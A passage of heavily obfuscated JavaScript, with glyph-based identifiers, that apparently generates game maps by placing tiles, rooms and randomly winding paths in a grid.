				if (ⲆⲆⲆ.ΔⲆⲆⲆⲆᐃⲆΔⲆ(ᐃⵠᐃⵠ, ⵠᐃ)) ⵠΔⲆΔ.ΔⲆⲆᐃⵠⲆⵠ = ⵠΔⲆΔ.ⵠᐃⵠΔⲆ;
				else if (ΔⲆΔⵠⲆ.ᐃΔⵠⲆ[ⵠᐃ][ᐃⵠᐃⵠ][ⵠ[26]] || ⵠΔⲆΔ.ⵠΔΔⲆΔ < Ⲇᐃᐃᐃ && ⵠⲆⲆ > ⵠΔⲆΔ.ΔⵠΔΔⵠ && ⵠΔⲆΔ.ΔⵠⵠⵠⵠΔⲆ < 0 && ⵠΔⲆΔ.ⵠⲆΔⲆΔⲆᐃ < 0 && ᐃⵠⲆ > ⵠΔⲆΔ.ⵠⲆΔⲆⵠ && 0 > ⵠΔⲆΔ.ᐃᐃⲆΔⲆ) ⵠΔⲆΔ.ΔⲆⲆᐃⵠⲆⵠ = ⲆⵠⲆⲆ;
				else ⵠΔⲆΔ.ΔⲆⲆᐃⵠⲆⵠ = ⵠΔⲆΔ.ⵠᐃⵠΔⲆ
			};
			this.ⵠⵠⵠᐃⲆⵠΔΔⵠ = function(Δⵠ, ⲆⵠⲆ) {
				ⲆⲆⲆ.ⵠΔΔⲆΔ = ⲆⲆⲆ.ⵠᐃⵠΔⲆ;
				ⲆⲆⲆ.ᐃᐃⲆΔⲆ = ⲆⲆⲆ.ⵠᐃⵠΔⲆ;
				ⲆⲆⲆ.ΔⵠΔΔⵠ = ⲆⲆⲆ.ⵠᐃⵠΔⲆ;
				ⲆⲆⲆ.ⵠⲆΔⲆⵠ = ⲆⲆⲆ.ⵠᐃⵠΔⲆ;
				ⲆⲆⲆ.ΔⵠⵠⵠⵠΔⲆ = ⲆⲆⲆ.ⵠᐃⵠΔⲆ;
				for (var ⵠᐃⲆⲆ = ⲆⲆⲆᐃ; ⲆⲆⲆ.ᐃⵠⵠⵠⵠ[ⵠᐃⲆⲆ].ΔᐃⲆ !== ⲆⲆⲆ.ⵠᐃΔᐃⲆ; ⵠᐃⲆⲆ++) {
					if (ⲆⲆⲆ.ⲆΔΔᐃΔ === ⲆⲆⲆ.ᐃⵠⵠⵠⵠ[ⵠᐃⲆⲆ].ΔᐃⲆ) ⲆⲆⲆ.ΔⵠⵠⵠⵠΔⲆ = Math.max(ⲆⲆⲆ.ΔⵠⵠⵠⵠΔⲆ, ⲆⲆⲆ.ⲆⲆⵠⵠᐃ(ⵠᐃⲆⲆ, Δⵠ, ⲆⵠⲆ));
					else if (ⲆⲆⲆ.ΔᐃΔⵠᐃⵠΔ === ⲆⲆⲆ.ᐃⵠⵠⵠⵠ[ⵠᐃⲆⲆ].ΔᐃⲆ) ⲆⲆⲆ.ⵠΔΔⲆΔ = Math.max(ⲆⲆⲆ.ⵠΔΔⲆΔ, ⲆⲆⲆ.ⲆⲆⵠⵠᐃ(ⵠᐃⲆⲆ, Δⵠ, ⲆⵠⲆ));
					else if (ⲆⲆⲆ.ᐃⵠⵠⵠⵠ[ⵠᐃⲆⲆ].ΔᐃⲆ === ⲆⲆⲆ.ⵠⵠΔΔΔΔᐃ) ⲆⲆⲆ.ᐃᐃⲆΔⲆ = Math.max(ⲆⲆⲆ.ᐃᐃⲆΔⲆ, ⲆⲆⲆ.ⲆⲆⵠⵠᐃ(ⵠᐃⲆⲆ, Δⵠ, ⲆⵠⲆ));
					else if (ⲆⲆⲆ.ᐃⵠⵠⵠⵠ[ⵠᐃⲆⲆ].ΔᐃⲆ === ⲆⲆⲆ.ΔⲆⵠᐃⲆⵠⵠ) {
						ⲆⲆⲆ.ΔⵠΔΔⵠ = Math.max(ⲆⲆⲆ.ΔⵠΔΔⵠ, ⲆⲆⲆ.ⲆⲆⵠⵠᐃ(ⵠᐃⲆⲆ, Δⵠ, ⲆⵠⲆ))
					} else ⲆⲆⲆ.ᐃⵠⵠⵠⵠ[ⵠᐃⲆⲆ].ΔᐃⲆ === ⲆⲆⲆ.ⵠΔᐃⲆⵠΔⲆ && (ⲆⲆⲆ.ⵠⲆΔⲆⵠ = Math.max(ⲆⲆⲆ.ⵠⲆΔⲆⵠ, ⲆⲆⲆ.ⲆⲆⵠⵠᐃ(ⵠᐃⲆⲆ, Δⵠ, ⲆⵠⲆ)))
				}
				if (ⲆⲆⲆ.ⵠΔΔⲆΔ < 0 && ⲆⲆⲆ.ⵠⲆΔⲆⵠ < ΔⲆⲆ && 0 > ⲆⲆⲆ.ΔⵠⵠⵠⵠΔⲆ && ⲆⲆⲆ.ⵠⲆΔⲆⵠ < 0 && 0 > ⲆⲆⲆ.ᐃᐃⲆΔⲆ) ⲆⲆⲆ.ΔⲆⲆᐃⵠⲆⵠ = 1;
				else ⲆⲆⲆ.ΔⲆⲆᐃⵠⲆⵠ = ⲆⲆⲆ.ⵠᐃⵠΔⲆ
			};
			this.ⲆΔᐃⵠⲆᐃΔⵠⵠ = function(ΔᐃΔⲆⵠⲆⵠ, Δⵠ, ⲆⵠⲆ) {
				var ᐃⲆⲆⵠ = ⲆⲆⲆ.ᐃⵠⵠⵠⵠ[ΔᐃΔⲆⵠⲆⵠ];
				var ⲆᐃᐃⲆΔⵠΔ = 0;
				ⵠᐃⵠⵠ = ᐃⲆⲆⵠ.x1 + 30 + (Δᐃᐃⵠ === (ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ⲆᐃΔΔᐃ) ? 150 : 0);
				var Δⵠⵠᐃ = Δⵠ - ⵠᐃⵠⵠ;
				0 < (ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ⲆᐃΔΔᐃ) && Δⵠⵠᐃ > Δᐃᐃⵠ && 320 > Δⵠⵠᐃ && (ⲆᐃᐃⲆΔⵠΔ = ΔⲆⵠ);
				ᐃᐃⵠⲆ = ᐃⲆⲆⵠ.y1 + 250 + (0 === (ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ⵠⲆⲆⵠΔ) ? 150 : ⲆΔⵠ);
				Δⵠⵠᐃ = ⲆⵠⲆ - ᐃᐃⵠⲆ;
				if (0 < (ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ⵠⲆⲆⵠΔ) && ⵠΔⲆⵠ < Δⵠⵠᐃ && Δⵠⵠᐃ < 320) ⲆᐃᐃⲆΔⵠΔ = ⵠΔᐃ;
				ⵠⵠΔᐃ = ᐃⲆⲆⵠ.x2 + 80 + ((ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ⲆᐃᐃΔᐃ) === ⵠΔⲆⵠ ? -200 : 0);
				Δⵠⵠᐃ = ⵠⵠΔᐃ - Δⵠ;
				if (0 < (ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ⲆᐃᐃΔᐃ) && Δⵠⵠᐃ > ᐃⵠⲆⵠ && Δⵠⵠᐃ < 320) ⲆᐃᐃⲆΔⵠΔ = 1;
				ΔᐃⵠⲆ = ᐃⲆⲆⵠ.y2 - 200 + (0 === (ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ᐃΔᐃᐃⲆ) ? -200 : ΔⲆⲆ);
				Δⵠⵠᐃ = ΔᐃⵠⲆ - ⲆⵠⲆ;
				if (ⵠᐃⲆᐃ < (ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ᐃΔᐃᐃⲆ) && Δⵠⵠᐃ > 0 && Δⵠⵠᐃ < 320) ⲆᐃᐃⲆΔⵠΔ = ΔⲆⵠ;
				if (ⵠᐃⵠⵠ <= Δⵠ && Δⵠ <= ⵠⵠΔᐃ && ⲆⵠⲆ >= ᐃᐃⵠⲆ && ⲆⵠⲆ <= ΔᐃⵠⲆ) return ⲆᐃᐃⲆΔⵠΔ;
				return 0
			};
			this.ⲆⲆⵠⵠᐃ = function(ΔᐃΔⲆⵠⲆⵠ, Δⵠ, ⲆⵠⲆ) {
				var ᐃⲆⲆⵠ = ⲆⲆⲆ.ᐃⵠⵠⵠⵠ[ΔᐃΔⲆⵠⲆⵠ];
				ⵠᐃⵠⵠ = ᐃⲆⲆⵠ.x1 + 30;
				ᐃᐃⵠⲆ = ᐃⲆⲆⵠ.y1 + 250;
				ⵠⵠΔᐃ = ᐃⲆⲆⵠ.x2 + 80;
				ΔᐃⵠⲆ = ᐃⲆⲆⵠ.y2 - 200;
				if (ⵠᐃⵠⵠ <= Δⵠ && Δⵠ <= ⵠⵠΔᐃ && ⲆⵠⲆ >= ᐃᐃⵠⲆ && ⲆⵠⲆ <= ΔᐃⵠⲆ) return Math.min(Δⵠ - ⵠᐃⵠⵠ, ⵠⵠΔᐃ - Δⵠ, ⲆⵠⲆ - ᐃᐃⵠⲆ, ΔᐃⵠⲆ - ⲆⵠⲆ);
				var ᐃⵠⵠᐃ = -1e6;
				if (0 > Δⵠ - ⵠᐃⵠⵠ) ᐃⵠⵠᐃ = Math.max(ᐃⵠⵠᐃ, Δⵠ - ⵠᐃⵠⵠ);
				else ⵠⵠΔᐃ - Δⵠ < ᐃⵠΔ && (ᐃⵠⵠᐃ = Math.max(ᐃⵠⵠᐃ, ⵠⵠΔᐃ - Δⵠ));
				ⵠⵠⲆΔᐃᐃⵠ = -1e6;
				if (ⲆⵠⲆ < ᐃᐃⵠⲆ || ΔᐃⵠⲆ < ⲆⵠⲆ) {
					if (ⲆⵠⲆ - ᐃᐃⵠⲆ < ⵠⲆⲆ) ⵠⵠⲆΔᐃᐃⵠ = Math.max(ⵠⵠⲆΔᐃᐃⵠ, ⲆⵠⲆ - ᐃᐃⵠⲆ);
					else ⵠⵠⲆΔᐃᐃⵠ = Math.max(ⵠⵠⲆΔᐃᐃⵠ, ΔᐃⵠⲆ - ⲆⵠⲆ);
					ᐃⵠⵠᐃ !== -1e6 && -1e6 !== ⵠⵠⲆΔᐃᐃⵠ ? ᐃⵠⵠᐃ = Math.min(ᐃⵠⵠᐃ, ⵠⵠⲆΔᐃᐃⵠ) : ᐃⵠⵠᐃ = ⵠⵠⲆΔᐃᐃⵠ
				}
				return ᐃⵠⵠᐃ
			};

			function ⲆⵠᐃⵠⵠⵠⲆⵠΔ(ⲆΔⲆⲆ, ΔⲆⵠᐃ) {
				var ᐃⲆⲆⵠ = ⲆⲆⲆ.ᐃⵠⵠⵠⵠ[ΔⲆⵠᐃ];
				for (var ⵠᐃⲆⲆ = 0, ΔⲆⵠⲆᐃ = Δᐃᐃᐃ; ⵠᐃⲆⲆ < ⲆΔⲆⲆ && ΔⲆⵠⲆᐃ < 1e4; ΔⲆⵠⲆᐃ++) {
					var ⲆⵠⲆ = ᐃⲆⲆⵠ.y1 + ⲆⲆⲆ.ᐃⵠΔΔⲆ.get() * ᐃⲆⲆⵠ.ⵠⵠᐃ;
					var Δⵠ = ᐃⲆⲆⵠ.x1 + ᐃⲆⲆⵠ.w * ⲆⲆⲆ.ᐃⵠΔΔⲆ.get();
					var ᐃᐃΔΔ = Math.floor(ⲆⵠⲆ / ΔΔᐃⵠᐃ);
					var ⲆⲆᐃⵠ = Math.floor(Δⵠ / 100);
					var ᐃⵠⵠᐃ = ⲆⲆⲆ.ⲆⲆⵠⵠᐃ(ΔⲆⵠᐃ, ⲆⲆᐃⵠ * ⲆⵠᐃΔⲆ + 50, ᐃᐃΔΔ * 100 + 50);
					if (600 > ᐃⵠⵠᐃ) continue;
					var ok = ΔⲆⵠ;
					for (var ⵠᐃ = ᐃᐃΔΔ - 4; 1 === ok && ⵠᐃ <= ᐃᐃΔΔ + ⵠⵠΔᐃΔ; ⵠᐃ++) {
						for (var ᐃⵠᐃⵠ = ⲆⲆᐃⵠ - ⵠΔᐃΔ; ok === ⵠΔᐃ && ᐃⵠᐃⵠ <= ⲆⲆᐃⵠ + ΔⲆⲆⲆ; ᐃⵠᐃⵠ++) {
							ΔⲆΔⵠⲆ.ᐃΔⵠⲆ[ⵠᐃ][ᐃⵠᐃⵠ] !== ⲆΔⵠⲆⲆ && (ok = ΔᐃΔΔ)
						}
					}
					if (ok === 0) continue;
					ⲆⵠⵠⲆ(ᐃᐃΔΔ, ⲆⲆᐃⵠ, ⵠ[156], ⵠᐃⲆⲆ % 6, ᐃⵠⲆ);
					ⵠᐃⲆⲆ++
				}
			}

			function ᐃΔᐃⵠⲆᐃⲆⵠᐃ(ΔⲆⵠᐃ, Ⲇᐃᐃⵠⵠ) {
				var ᐃⲆⲆⵠ = ⲆⲆⲆ.ᐃⵠⵠⵠⵠ[ΔⲆⵠᐃ];
				var ⵠᐃ = Math.floor(ᐃⲆⲆⵠ.y1 / 100);
				var ᐃⵠᐃⵠ = Math.floor(ᐃⲆⲆⵠ.x1 / ΔΔᐃⵠᐃ);
				var ⵠⵠᐃ = Math.floor(ᐃⲆⲆⵠ.ⵠⵠᐃ / ΔΔⲆⵠΔⲆⵠ);
				var ᐃⵠⵠ = Math.floor(ᐃⲆⲆⵠ.w / 100);
				var ΔΔⵠⲆᐃ = ⵠᐃ + Math.floor(ⵠⵠᐃ / 2);
				var w2 = ᐃⵠᐃⵠ + Math.floor(ᐃⵠⵠ / ⲆⵠΔΔ);
				for (var ⵠᐃⲆⲆ = 0; ⵠᐃⲆⲆ < 3; ⵠᐃⲆⲆ++) {
					var ᐃᐃΔΔ = Math.floor(ΔΔⵠⲆᐃ - 3 + 6 * ⲆⲆⲆ.ᐃⵠΔΔⲆ.get());
					var ⲆⲆᐃⵠ = Math.floor(w2 - ⲆᐃΔᐃ + ⵠᐃᐃΔ * ⲆⲆⲆ.ᐃⵠΔΔⲆ.get());
					ⲆⵠⵠⲆ(ᐃᐃΔΔ, ⲆⲆᐃⵠ, ⵠ[138], ⵠᐃⲆⲆ, ΔᐃⲆⵠ)
				}
				for (var ⵠᐃⲆⲆ = ᐃⵠⲆⵠ; 80 > ⵠᐃⲆⲆ; ⵠᐃⲆⲆ++) {
					var ᐃᐃΔΔ = Math.floor(ΔΔⵠⲆᐃ - 3 + 6 * ⲆⲆⲆ.ᐃⵠΔΔⲆ.get());
					var ⲆⲆᐃⵠ = Math.floor(w2 - ΔΔᐃΔ + ⲆⲆⲆ.ᐃⵠΔΔⲆ.get() * 6);
					if (1 === ⲆⵠⵠⲆ(ᐃᐃΔΔ, ⲆⲆᐃⵠ, ⵠ[26], Δⵠᐃ, 1)) Ⲇᐃᐃⵠⵠ.push([ᐃᐃΔΔ, ⲆⲆᐃⵠ, 0])
				}
			}

			function ΔΔΔⵠⵠⲆΔ(ΔⲆⵠᐃ, Ⲇᐃᐃⵠⵠ) {
				for (var ⵠᐃⲆⲆ = 0; ⵠᐃⲆⲆ < Ⲇᐃᐃⵠⵠ.length; ⵠᐃⲆⲆ++) {
					var ᐃᐃΔΔ = Ⲇᐃᐃⵠⵠ[ⵠᐃⲆⲆ][0];
					var ⲆⲆᐃⵠ = Ⲇᐃᐃⵠⵠ[ⵠᐃⲆⲆ][1];
					var ⲆⲆⲆᐃⲆΔΔ = Ⲇᐃᐃⵠⵠ[ⵠᐃⲆⲆ][Ⲇⵠⵠᐃ];
					ⲆⲆᐃΔᐃᐃⲆⵠΔ(ᐃᐃΔΔ, ⲆⲆᐃⵠ, ΔⲆⵠᐃ, ⲆⲆⲆᐃⲆΔΔ)
				}
			}

			function ⲆΔΔⵠᐃΔⵠ(ⵠᐃ, ᐃⵠᐃⵠ, ⲆⲆΔⲆⵠ, ⲆᐃΔⲆⵠⵠⲆⲆⵠ, ᐃᐃᐃⵠᐃΔⲆΔᐃ, Ⲇᐃᐃⵠⵠ, ᐃⵠⵠ, ⵠⵠᐃ) {
				var w1 = Math.floor(ᐃⵠⵠ / ΔⲆΔΔΔ);
				var w2 = Math.max(1, Math.floor(ᐃⵠⵠ / Ⲇⵠⵠᐃ));
				var ᐃⵠᐃⲆⵠⲆⲆⵠᐃ = Math.floor(ⵠⵠᐃ / 2);
				var ΔΔⵠⲆᐃ = Math.max(ⵠⲆΔ, Math.floor(ⵠⵠᐃ / ⵠΔⲆᐃ));
				for (var ⵠᐃⲆⲆ = 0; ⲆⲆΔⲆⵠ > ⵠᐃⲆⲆ; ⵠᐃⲆⲆ++) {
					for (var ᐃᐃΔΔ = ⵠᐃ - ᐃⵠᐃⲆⵠⲆⲆⵠᐃ; ⵠᐃ + ΔΔⵠⲆᐃ > ᐃᐃΔΔ; ᐃᐃΔΔ++) {
						for (var ⲆⲆᐃⵠ = ᐃⵠᐃⵠ - w1; ⲆⲆᐃⵠ < ᐃⵠᐃⵠ + w2; ⲆⲆᐃⵠ++) {
							1 === ⲆⵠⵠⲆ(ᐃᐃΔΔ, ⲆⲆᐃⵠ, ⵠ[26], 0, Ⲇᐃⵠ) && Ⲇᐃᐃⵠⵠ.push([ᐃᐃΔΔ, ⲆⲆᐃⵠ, 1])
						}
					}
					ⵠᐃ += ⲆᐃΔⲆⵠⵠⲆⲆⵠ;
					ᐃⵠᐃⵠ += ᐃᐃᐃⵠᐃΔⲆΔᐃ
				}
			}

			function ⲆⵠⲆΔᐃᐃⵠ(ΔⲆⵠᐃ, Ⲇᐃᐃⵠⵠ) {
				var ᐃⲆⲆⵠ = ⲆⲆⲆ.ᐃⵠⵠⵠⵠ[ΔⲆⵠᐃ];
				var ⵠᐃ = Math.floor(ᐃⲆⲆⵠ.y1 / ⵠᐃᐃᐃᐃΔⵠ);
				var ᐃⵠᐃⵠ = Math.floor(ᐃⲆⲆⵠ.x1 / ⵠⵠΔᐃᐃ);
				var ⵠⵠᐃ = Math.floor(ᐃⲆⲆⵠ.ⵠⵠᐃ / ⵠᐃⲆΔΔ);
				var ᐃⵠⵠ = Math.floor(ᐃⲆⲆⵠ.w / 100);
				var ⲆⲆⵠⵠΔⲆⵠⲆⲆ = ⵠᐃ + ⵠⵠᐃ;
				var ΔⵠᐃΔᐃΔⲆᐃΔ = ᐃⵠᐃⵠ + ᐃⵠⵠ;
				var ⵠᐃΔᐃΔᐃⲆ = 2;
				var ⲆⵠⵠΔⲆ = ⵠⵠᐃ;
				var ᐃᐃΔΔ = ⵠᐃ;
				var ⲆⲆᐃⵠ = ᐃⵠᐃⵠ + ⵠⲆⲆᐃⵠ + Math.floor(ⲆⲆⲆ.ᐃⵠΔΔⲆ.get() * (ᐃⵠⵠ - ᐃᐃⵠⵠⲆ));
				for (var ΔⲆᐃᐃⵠ = ⲆⲆᐃⵠ - 4; ΔⲆᐃᐃⵠ < ⲆⲆᐃⵠ + 4; ΔⲆᐃᐃⵠ++) ⲆⵠⵠⲆ(ⵠᐃ - ⵠⲆΔ, ΔⲆᐃᐃⵠ, ⵠ[26], 0, 1);
				while (ⲆⵠⵠΔⲆ > 0) {
					if (2 === ⵠᐃΔᐃΔᐃⲆ) {
						for (var ⵠᐃⲆⲆ = ⵠⵠΔⲆᐃ; ⵠᐃⲆⲆ > ⵠΔⲆ; ⵠᐃⲆⲆ--) {
							ⲆΔΔⵠᐃΔⵠ(ᐃᐃΔΔ, ⲆⲆᐃⵠ, 1, ΔⵠΔⵠ, Ⲇᐃᐃᐃ, Ⲇᐃᐃⵠⵠ, ⵠᐃⲆⲆ, ΔΔΔ);
							ⲆⵠⵠΔⲆ -= 1;
							ᐃᐃΔΔ += 1
						}
						ⵠᐃΔᐃΔᐃⲆ = ᐃⵠⲆⵠ;
						continue
					}
					if (ⲆⵠⵠΔⲆ < ᐃⵠᐃΔⵠ) {
						for (var ⵠᐃⲆⲆ = ⵠᐃⵠΔ; ᐃⵠⲆⵠ < ⲆⵠⵠΔⲆ; ⵠᐃⲆⲆ++) {
							ⲆΔΔⵠᐃΔⵠ(ᐃᐃΔΔ, ⲆⲆᐃⵠ, ⵠΔⲆ, ΔΔΔ, ᐃⵠⲆⵠ, Ⲇᐃᐃⵠⵠ, ⵠᐃⲆⲆ, 1);
							ⲆⵠⵠΔⲆ -= ⵠΔΔ;
							ᐃᐃΔΔ += Ⲇᐃⵠ
						}
						continue
					}
					if (ⵠᐃΔᐃΔᐃⲆ === 1) {
						var ᐃΔⵠΔⲆΔⵠ = Math.min(ⲆⵠⵠΔⲆ, Math.floor(1 + ⲆⲆⲆ.ᐃⵠΔΔⲆ.get() * 4));
						var ᐃⵠⵠ = 1 + Math.floor(ⲆⲆⲆ.ᐃⵠΔΔⲆ.get() * 4);
						ⲆΔΔⵠᐃΔⵠ(ᐃᐃΔΔ, ⲆⲆᐃⵠ, ᐃΔⵠΔⲆΔⵠ, 1, ΔⲆⵠⲆ, Ⲇᐃᐃⵠⵠ, ᐃⵠⵠ, ᐃⵠⵠ);
						ⵠᐃΔᐃΔᐃⲆ = ΔⲆⵠⲆ;
						ⲆⵠⵠΔⲆ -= ᐃΔⵠΔⲆΔⵠ;
						ᐃᐃΔΔ += ᐃΔⵠΔⲆΔⵠ;
						continue
					}
					ⵠᐃΔᐃΔᐃⲆ = 1;
					var ᐃΔᐃⲆᐃ = Math.floor(1 + Δᐃⵠⵠ * ⲆⲆⲆ.ᐃⵠΔΔⲆ.get());
					var ΔΔⵠᐃᐃᐃᐃ = 1 + Math.floor(ⲆⲆⲆ.ᐃⵠΔΔⲆ.get() * Ⲇᐃⵠᐃ);
					if (ⲆⲆᐃⵠ < ᐃⵠᐃⵠ + ΔⵠᐃᐃⵠⲆⲆ) {
						ⲆΔΔⵠᐃΔⵠ(ᐃᐃΔΔ, ⲆⲆᐃⵠ, ᐃΔᐃⲆᐃ, 0, Ⲇᐃⵠ, Ⲇᐃᐃⵠⵠ, ΔΔⵠᐃᐃᐃᐃ, ΔΔⵠᐃᐃᐃᐃ);
						ⲆⲆᐃⵠ += ᐃΔᐃⲆᐃ
					} else if (ⲆⲆᐃⵠ > ΔⵠᐃΔᐃΔⲆᐃΔ - ᐃⲆⲆΔΔⵠΔ) {
						ⲆΔΔⵠᐃΔⵠ(ᐃᐃΔΔ, ⲆⲆᐃⵠ, ᐃΔᐃⲆᐃ, Δᐃᐃⵠ, -1, Ⲇᐃᐃⵠⵠ, ΔΔⵠᐃᐃᐃᐃ, ΔΔⵠᐃᐃᐃᐃ);
						ⲆⲆᐃⵠ -= ᐃΔᐃⲆᐃ
					} else if (ⲆⲆⲆ.ᐃⵠΔΔⲆ.get() > .5) {
						ⲆΔΔⵠᐃΔⵠ(ᐃᐃΔΔ, ⲆⲆᐃⵠ, ᐃΔᐃⲆᐃ, 0, ⵠᐃⵠΔ, Ⲇᐃᐃⵠⵠ, ΔΔⵠᐃᐃᐃᐃ, ΔΔⵠᐃᐃᐃᐃ);
						ⲆⲆᐃⵠ += ᐃΔᐃⲆᐃ
					} else {
						ⲆΔΔⵠᐃΔⵠ(ᐃᐃΔΔ, ⲆⲆᐃⵠ, ᐃΔᐃⲆᐃ, 0, -1, Ⲇᐃᐃⵠⵠ, ΔΔⵠᐃᐃᐃᐃ, ΔΔⵠᐃᐃᐃᐃ);
						ⲆⲆᐃⵠ -= ᐃΔᐃⲆᐃ
					}
				}
				for (var ΔⲆᐃᐃⵠ = ⲆⲆᐃⵠ - 1; ⲆⲆᐃⵠ + 2 > ΔⲆᐃᐃⵠ; ΔⲆᐃᐃⵠ++) ⲆⵠⵠⲆ(ᐃᐃΔΔ, ΔⲆᐃᐃⵠ, ⵠ[26], 0, ΔΔᐃⵠ)
			}
			this.ᐃⲆⵠⵠⲆᐃΔ = function(ᐃᐃⵠⵠ, Δⵠ, ⲆⵠⲆ) {
				var ᐃᐃΔΔ = ⲆⵠⲆ;
				var ⲆⲆᐃⵠ = Δⵠ;
				ⲆⵠⵠⲆ(ᐃᐃΔΔ, ⲆⲆᐃⵠ, ⵠ[424], ᐃᐃⵠⵠ, ᐃΔᐃⲆ);
				for (var ⵠᐃⲆⲆ = 0; ⵠᐃⲆⲆ < Ⲇᐃⵠᐃ; ⵠᐃⲆⲆ++) {
					for (var ⲆⲆⵠΔ = 0; ⲆⲆⵠΔ < 3; ⲆⲆⵠΔ++) {
						ⲆⵠⵠⲆ(ᐃᐃΔΔ - ⲆⲆⵠΔ, ⲆⲆᐃⵠ - ⵠᐃⲆⲆ, ⵠ[271], ⲆΔⵠ);
						ⲆⵠⵠⲆ(ᐃᐃΔΔ + ⲆⲆⵠΔ, ⲆⲆᐃⵠ - ⵠᐃⲆⲆ, ⵠ[271], 0);
						ⲆⵠⵠⲆ(ᐃᐃΔΔ + ⲆⲆⵠΔ, ⲆⲆᐃⵠ + ⵠᐃⲆⲆ, ⵠ[271], 0);
						ⲆⵠⵠⲆ(ᐃᐃΔΔ - ⲆⲆⵠΔ, ⲆⲆᐃⵠ + ⵠᐃⲆⲆ, ⵠ[271], ᐃⵠⲆⵠ)
					}
				}
				if (0 === ᐃᐃⵠⵠ) {
					for (var ⵠᐃⲆⲆ = ᐃΔΔ; ⵠᐃⲆⲆ < ᐃⲆⵠᐃ; ⵠᐃⲆⲆ++) {
						ⲆⵠⵠⲆ(ᐃᐃΔΔ - ⵠᐃⲆⲆ, ⲆⲆᐃⵠ - ᐃⵠⵠΔ, ⵠ[271], 0);
						ⲆⵠⵠⲆ(ᐃᐃΔΔ + ⵠᐃⲆⲆ, ⲆⲆᐃⵠ - 4, ⵠ[271], Ⲇᐃᐃᐃ);
						ⲆⵠⵠⲆ(ᐃᐃΔΔ - ⵠᐃⲆⲆ, ⲆⲆᐃⵠ + ⵠΔΔᐃΔ, ⵠ[271], 0);
						ⲆⵠⵠⲆ(ᐃᐃΔΔ + ⵠᐃⲆⲆ, ⲆⲆᐃⵠ + 4, ⵠ[271], 0)
					}
					for (var ⵠᐃⲆⲆ = ΔΔⵠ; ⵠᐃⲆⲆ < ᐃⲆᐃᐃ; ⵠᐃⲆⲆ++) {
						ⲆⵠⵠⲆ(ᐃᐃΔΔ - ΔⲆᐃⲆ, ⲆⲆᐃⵠ + ⵠᐃⲆⲆ, ⵠ[271], 0);
						ⲆⵠⵠⲆ(ᐃᐃΔΔ + Δⵠᐃⵠ, ⲆⲆᐃⵠ + ⵠᐃⲆⲆ, ⵠ[271], ΔⲆⵠⲆ);
						ⲆⵠⵠⲆ(ᐃᐃΔΔ - ⵠⵠⵠⵠ, ⲆⲆᐃⵠ - ⵠᐃⲆⲆ, ⵠ[271], 0);
						ⲆⵠⵠⲆ(ᐃᐃΔΔ + ⲆᐃΔᐃ, ⲆⲆᐃⵠ - ⵠᐃⲆⲆ, ⵠ[271], 0)
					}
					ⲆⵠⵠⲆ(ᐃᐃΔΔ - 2, ⲆⲆᐃⵠ - ΔⲆᐃⵠᐃ, ⵠ[271], 0);
					ⲆⵠⵠⲆ(ᐃᐃΔΔ - 3, ⲆⲆᐃⵠ - 3, ⵠ[271], 0);
					ⲆⵠⵠⲆ(ᐃᐃΔΔ + ᐃⲆⵠᐃΔ, ⲆⲆᐃⵠ + ⲆⵠΔⵠ, ⵠ[271], 0);
					ⲆⵠⵠⲆ(ᐃᐃΔΔ + 3, ⲆⲆᐃⵠ + ᐃᐃⵠⲆᐃ, ⵠ[271], 0)
				} else if (ᐃᐃⵠⵠ === 1) {
					for (var ⵠᐃⲆⲆ = Δᐃᐃⵠ; 3 > ⵠᐃⲆⲆ; ⵠᐃⲆⲆ++) {
						ⲆⵠⵠⲆ(ᐃᐃΔΔ - ⵠᐃⲆⲆ, ⲆⲆᐃⵠ - ⵠᐃᐃⲆ, ⵠ[271], ᐃⵠⲆⵠ);
						ⲆⵠⵠⲆ(ᐃᐃΔΔ + ⵠᐃⲆⲆ, ⲆⲆᐃⵠ - ΔΔⵠⵠΔ, ⵠ[271], 0);
						ⲆⵠⵠⲆ(ᐃᐃΔΔ - ⵠᐃⲆⲆ, ⲆⲆᐃⵠ + ⲆᐃᐃΔ, ⵠ[271], ⵠⲆᐃⵠ);
						ⲆⵠⵠⲆ(ᐃᐃΔΔ + ⵠᐃⲆⲆ, ⲆⲆᐃⵠ + 4, ⵠ[271], 0)
					}
					for (var ⵠᐃⲆⲆ = 0; ⵠᐃⲆⲆ < ΔⲆᐃⵠᐃ; ⵠᐃⲆⲆ++) {
						ⲆⵠⵠⲆ(ᐃᐃΔΔ - ᐃᐃⵠⲆᐃ, ⲆⲆᐃⵠ + ⵠᐃⲆⲆ, ⵠ[271], ᐃⵠⲆⵠ);
						ⲆⵠⵠⲆ(ᐃᐃΔΔ + ΔⲆᐃⲆ, ⲆⲆᐃⵠ + ⵠᐃⲆⲆ, ⵠ[271], ⵠⲆᐃⵠ);
						ⲆⵠⵠⲆ(ᐃᐃΔΔ - ⲆᐃΔᐃ, ⲆⲆᐃⵠ - ⵠᐃⲆⲆ, ⵠ[271], Δⵠᐃ);
						ⲆⵠⵠⲆ(ᐃᐃΔΔ + Δⵠᐃⵠ, ⲆⲆᐃⵠ - ⵠᐃⲆⲆ, ⵠ[271], 0)
					}
				} else if (ΔⵠᐃⲆ === ᐃᐃⵠⵠ) {
					for (var ⵠᐃⲆⲆ = 0; ⵠᐃⲆⲆ < Ⲇⵠⵠᐃ; ⵠᐃⲆⲆ++) {
						ⲆⵠⵠⲆ(ᐃᐃΔΔ - ⵠᐃⲆⲆ, ⲆⲆᐃⵠ - ⵠⲆⵠᐃ, ⵠ[271], 0);
						ⲆⵠⵠⲆ(ᐃᐃΔΔ + ⵠᐃⲆⲆ, ⲆⲆᐃⵠ - 4, ⵠ[271], 0);
						ⲆⵠⵠⲆ(ᐃᐃΔΔ - ⵠᐃⲆⲆ, ⲆⲆᐃⵠ + ⲆⵠᐃⲆ, ⵠ[271], 0);
						ⲆⵠⵠⲆ(ᐃᐃΔΔ + ⵠᐃⲆⲆ, ⲆⲆᐃⵠ + 4, ⵠ[271], 0)
					}
					for (var ⵠᐃⲆⲆ = 0; ΔⲆᐃⲆ > ⵠᐃⲆⲆ; ⵠᐃⲆⲆ++) {
